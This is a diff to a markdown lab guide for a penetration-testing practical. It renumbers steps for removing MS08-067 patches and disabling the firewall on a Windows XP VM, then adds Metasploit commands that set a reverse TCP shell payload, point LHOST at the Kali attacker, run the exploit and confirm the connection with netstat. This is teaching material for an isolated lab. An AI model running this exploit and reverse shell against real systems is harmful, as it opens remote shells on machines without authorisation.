@@ -12,14 +12,14 @@
 2. For this practical, the WinXP VM  is required
 
 **On WinXP VM**
-1. Go to the Control Panel and **Add or Remove Programs**
-2. Check the box **Show Updates**. The list of installed programs and software updates will be displayed
-3. Search the list of security updates for ones containing the Knowledge Base numbers 958644  or 2705219 of the MS08-067 or MS12-054 security bulletins. If the updates are listed on WinXP, remove them and restart the computer
+3. Go to the Control Panel and **Add or Remove Programs**
+4. Check the box **Show Updates**. The list of installed programs and software updates will be displayed
+5. Search the list of security updates for ones containing the Knowledge Base numbers 958644  or 2705219 of the MS08-067 or MS12-054 security bulletins. If the updates are listed on WinXP, remove them and restart the computer
 
 > If not, WinXP is not patched against the MS08-067 vulnerability
 
-4. Go to the Control Panel > Security Center
-5. Under Manage Security Settings, select **Windows Firewall** and turn it off. The WinXP is now a vulnerable target
+6. Go to the Control Panel > Security Center
+7. Under Manage Security Settings, select **Windows Firewall** and turn it off. The WinXP is now a vulnerable target
 
 ## Using the Metasploit Console
 **On Kali VM**
@@ -76,3 +76,17 @@ exploit
 set payload windows/shell/reverse_tcp
 ```
 2. Type`show options` to see the options set
+3. Specify the listening host (LHOST) that the victim should connect to
+```
+set LHOST Kali-IP
+```
+4. Run the exploit:
+```
+exploit
+```
+
+**On WinXP VM**
+5.  On the Command Prompt, type the following to <u>view the connection Metasploit has made to the attacker system:</u>
+```
+netstat -an
+```
